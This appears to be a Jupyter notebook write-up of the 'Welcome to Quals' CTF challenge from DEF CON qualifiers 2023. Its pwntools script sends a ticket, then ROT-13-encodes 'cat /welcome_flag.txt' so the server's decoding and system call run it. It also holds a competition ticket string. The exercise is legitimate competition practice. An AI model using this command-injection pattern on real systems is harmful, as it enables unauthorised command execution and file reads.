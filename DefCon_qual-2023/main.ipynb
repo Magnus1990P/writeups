{
 "cells": [
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Welcome to Quals\n",
    "\n",
    "1. The input is rot-13 on the server side, so by encoding it prior to sending resolve the issue.\n",
    "2. Listing the files on the system to find a possible \"flag\"-file since it is an intro\n",
    "3. get the output of the file.\n",
    "\n",
    "## mishaps\n",
    "1. Trying to run the `run_challeng.sh` file\n",
    "2. Grabbing the ELF binary file `challenge` and trying to disassemble, only to realise this is the server prompting you and only ROT-13 the input and performing a system call"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import pwn\n",
    "import codecs\n",
    "\n",
    "con = pwn.connect(\"welcome-to-quals-vfnva65rlchqk.shellweplayaga.me\", 10001)\n",
    "ticket = b\"ticket{LeaseAmenity994n23:GFvP434yRUlErDgkIQEPStAlW--4xPaFLdO9wJasXyKAsUAD}\"\n",
    "con.sendline(ticket)\n",
    "r = con.recvline(timeout=1)\n",
    "print(r)\n",
    "\n",
    "pl = \"cat /welcome_flag.txt\"\n",
    "p1_rot13 = codecs.encode(pl, \"rot_13\")\n",
    "con.sendline(p1_rot13)\n",
    "r = con.recvall(timeout=5)\n",
    "print(r.decode(\"utf-8\"))"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.3"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
